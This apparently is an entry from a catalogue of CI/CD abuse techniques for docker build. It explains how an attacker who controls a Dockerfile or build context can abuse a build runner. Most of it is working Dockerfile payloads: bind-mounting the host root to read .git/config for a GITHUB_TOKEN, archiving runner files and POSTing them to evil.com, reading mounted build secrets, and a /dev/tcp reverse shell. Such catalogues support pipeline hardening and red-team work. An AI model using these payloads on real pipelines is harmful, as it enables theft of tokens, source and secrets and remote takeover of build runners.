---
title: docker
tags:
  - cli
  - config-file
  - eval-sh
references: 
  - https://docs.docker.com/reference/dockerfile/
  - https://docs.docker.com/build/concepts/dockerfile/
files: [Dockerfile]
---

`docker` is a container tool to create OCI image and run containers. The build stage can be configured using a Dockerfile.
`docker build <path>` is strongly limited to the build context. No modification can be done to the file system.

Exfiltrate **GITHUB_TOKEN**
```Dockerfile
RUN --mount=type=bind,source=/,target=/host \
    cat /host/.git/config
```

If the context path is controllable `docker build <controlled_path> -f <Dockerfile>`, any data from the runner is exfiltrable.
```Dockerfile
RUN --mount=type=bind,source=/,target=/host \
    tar -czf /src.tar.gz /host/* ; \
    curl -X POST -d "/src.tar.gz" http://evil.com
```

Exfiltrate runner secrets, if secrets are used: `docker build --secret id=mysecret,src=secretFile .`
```Dockerfile
RUN --mount=type=secret,id=mysecret \
    cat /run/secrets/mysecret
```

The image can be modified for RCE on creation of the container:
```Dockerfile
FROM linuxserver/openssh-server
FROM myorg/evil 
RUN sh -i >& /dev/tcp/10.10.0.2/443 0>&1
```
